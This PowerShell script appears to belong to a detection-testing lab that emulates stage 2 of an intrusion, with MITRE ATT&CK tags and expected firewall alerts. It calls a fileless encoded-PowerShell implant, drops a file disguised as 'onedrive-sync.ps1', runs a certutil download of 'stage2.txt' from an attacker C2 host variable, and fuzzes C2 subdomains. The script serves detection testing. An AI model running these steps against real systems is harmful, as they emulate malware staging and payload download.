<#
    Stage 2 (MIDDLE) - Subdomain fuzzing : finding live C2 nodes
    ===========================================================
    The implant sprays many subdomain lookups/requests under one root domain to
    discover live C2 / virtual hosts - a volume spike the firewall flags.

      EAL alert : 'Subdomain Fuzzing'  (rule fdcaa14c)
      ATT&CK    : Reconnaissance (TA0043) / Active Scanning: Wordlist (T1595.003)
#>
param([switch]$DryRun)
. "$PSScriptRoot\..\config\lab-config.ps1"
. "$PSScriptRoot\_net.ps1"
. "$PSScriptRoot\_endpoint.ps1"
$cfg = $Global:EalDemo
if ($DryRun) { $cfg.DryRun = $true }

# --- XDR endpoint layer: the fileless implant executes ---------------------
Write-Stage "STAGE 2a (XDR/endpoint): fileless PowerShell implant executes" "INFO"
Invoke-EncodedPowershell
New-AppDataDrop -Name "onedrive-sync.ps1"
Invoke-LolbinDownload -Url "http://$($cfg.AttackerC2)/stage2.txt" -Tool "certutil"

# --- EAL network layer: C2 node discovery via subdomain fuzzing ------------
Write-Stage "STAGE 2b (EAL/network): fuzzing $($cfg.FuzzCount) subdomains of $($cfg.C2RootDomain)" "INFO"
$words = @("cdn","api","node","gw","relay","mail","vpn","sync","update","cloud","edge","proxy","auth","data","img","static","dev","test","admin","panel")
for ($i=1; $i -le $cfg.FuzzCount; $i++) {
    $w = $words[(Get-Random -Max $words.Count)]
    $sub = "$w$i.$($cfg.C2RootDomain)"
    Invoke-Dns -Name $sub -Type A -Label "fuzz"
    if ($i % 15 -eq 0) { Write-Stage "  ... $i/$($cfg.FuzzCount) subdomains probed" "INFO" }
}
# Firewall anchor: fires an INSTANT PAN NGFW DNS-Security detection (no baseline).
Invoke-TestDns -Category "subdomain-reputation"
Invoke-TestDns -Category "dga"
Write-Stage "STAGE 2 done. Expect FW NGFW: DNS-Security subdomain-reputation/DGA + (once baselined) EAL 'Subdomain Fuzzing' fdcaa14c." "OK"
